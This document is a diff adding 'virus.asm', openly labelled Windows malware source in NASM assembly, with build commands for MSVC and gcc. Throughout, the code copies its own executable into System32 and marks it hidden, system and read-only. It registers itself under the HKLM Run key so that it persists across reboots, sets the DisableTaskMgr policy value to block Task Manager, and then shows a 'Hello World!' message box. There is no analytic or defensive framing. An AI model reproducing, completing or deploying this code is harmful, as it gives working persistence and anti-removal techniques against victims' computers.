@@ -1,0 +1,142 @@
+; 1. get libs form MS SDK or MASM32 package
+; 2. nasm virus.asm -fwin32
+ 
+; 3. a) msvc:
+; link.exe virus.obj "%LIBPATH%\kernel32.lib" "%LIBPATH%\user32.lib" "%LIBPATH%\advapi32.lib" /ENTRY:main /SUBSYSTEM:WINDOWS
+ 
+; 3. b) cygwin/gcc:
+; gcc virus.obj "$LIBPATH/kernel32.lib" "$LIBPATH/user32.lib" "$LIBPATH/advapi32.lib" -mwindows -nostdlib -Xlinker -e_main -s -o virus.exe
+ 
+section .data    data  align=4   ;read/write
+ 
+Key_Value  dd 0x01
+Virus_Name  dd "\virus.exe",0x00
+length equ $-Virus_Name
+Reg_Name  dd "Virus",0x00
+Run dd "Software\Microsoft\Windows\CurrentVersion\Run",0x00
+Task_Man  dd "Software\Microsoft\Windows\CurrentVersion\Policies\System",0x00
+Task_Man_Key dd "disabletaskmgr",0x00
+szTitle   dd  "Virus:",0x00
+szText   dd  "Hello World!",0x00
+ 
+ 
+section .bss      bss   align=4  ;read/write
+ 
+Virus_Handle resd 1
+Key_Handle  resd 1
+String_Length resd 1
+Virus_Path resb 260
+Sys_Dir resb 260
+ 
+ 
+;section .rdata rdata align=4    ;read
+ 
+section .text     code  align=16    ;read/execute
+ 
+global _main
+ 
+;kernel32.dll
+extern __imp__ExitProcess@4
+extern __imp__GetModuleHandleA@4
+extern __imp__GetModuleFileNameA@12
+extern __imp__GetSystemDirectoryA@8
+extern __imp__CopyFileA@12
+extern __imp__SetFileAttributesA@8
+ 
+;user32.dll
+extern __imp__MessageBoxA@16
+ 
+;advapi32.dll
+extern __imp__RegCreateKeyExA@36
+extern __imp__RegOpenKeyExA@20
+extern __imp__RegSetValueExA@24
+extern __imp__RegCloseKey@4
+ 
+section .code USE32
+_main:
+ 
+    push 0x00
+    call [__imp__GetModuleHandleA@4]
+    mov  [Virus_Handle],eax  ;Get Handle of virus
+ 
+    push 0x0104                ;MAX_PATH
+    push Virus_Path
+    push dword [Virus_Handle]
+    call [__imp__GetModuleFileNameA@12] ;Get path of virus
+ 
+    push 0x0104                   ;MAX_PATH
+    push Sys_Dir
+    call [__imp__GetSystemDirectoryA@8] ;Find System32
+ 
+    mov  edi,Sys_Dir
+    add  edi,eax
+    mov  esi,Virus_Name
+    mov ecx, length
+    cld
+    repe  movsb  ;Append virus name to system32 path
+ 
+    push 0x00
+    push Sys_Dir
+    push Virus_Path
+    call [__imp__CopyFileA@12]  ;Copy Virus
+ 
+    push 0x20|0x02|0x01|0x04 ;FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM
+    push Sys_Dir
+    call [__imp__SetFileAttributesA@8] ;Set virus attributes
+ 
+    push Key_Handle
+    push 0x0002 ;KEY_SET_VALUE
+    push 0x00
+    push Run
+    push 0x80000002 ;HKEY_LOCAL_MACHINE
+    call [__imp__RegOpenKeyExA@20]   ;Open Run key
+ 
+    mov  edi,Sys_Dir    ;Calculate size of string and store in ECX
+    mov ecx,-1
+    xor al,al
+     
+    repne scasb
+    sub edi,Sys_Dir
+ 
+    push edi
+    push Sys_Dir
+    push 0x01
+    push 0x00
+    push Reg_Name
+    push dword [Key_Handle]
+    call [__imp__RegSetValueExA@24]  ;Set registry value
+ 
+    push dword [Key_Handle]
+    call [__imp__RegCloseKey@4]
+ 
+    xor  eax,eax
+    mov  dword [Key_Handle],eax ;Clear Key handle
+     
+    push 0x00
+    push Key_Handle
+    push 0x00
+    push 0x20006 ;KEY_WRITE
+    push 0x00
+    push 0x00
+    push 0x00
+    push Task_Man
+    push 0x80000001 ;HKEY_CURRENT_USER
+    call [__imp__RegCreateKeyExA@36]
+    push 0x04
+    push Key_Value
+    push 0x04 ;REG_DWORD
+    push 0x00
+    push Task_Man_Key
+    push dword [Key_Handle]
+    call [__imp__RegSetValueExA@24]  ;Disable taskmanager
+    push dword [Key_Handle]
+    call [__imp__RegCloseKey@4]
+ 
+    push 0x00|0x40 ;MB_OK|MB_ICONINFORMATION
+    push szTitle
+    push szText
+    push 0x00
+    call [__imp__MessageBoxA@16]   ;Popup Info box
+ 
+    push 0x00
+    call [__imp__ExitProcess@4]   ;Exit
